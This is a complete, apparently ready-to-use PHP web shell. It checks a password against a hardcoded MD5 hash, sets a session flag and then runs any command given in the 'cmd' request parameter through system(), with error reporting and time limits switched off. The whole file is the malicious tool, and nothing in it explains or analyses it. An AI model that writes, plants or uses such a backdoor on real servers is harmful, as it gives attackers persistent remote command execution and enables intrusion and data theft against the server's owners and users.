<?php
$shellpass = "684955794fee2315c96ec35b182d111b"; // nama pw taro disini biar ga lupa
session_start();
@error_reporting(0);
@set_time_limit(0);
function Login() {
?>
<html>
<head>
</style>
<center>
<form method="post">
<font face ='comic sans ms' size='3' color='black'>Password :
<input type="password" name="pass">
	<input type="submit" value="Login">
</form>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($shellpass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $shellpass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
?>
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
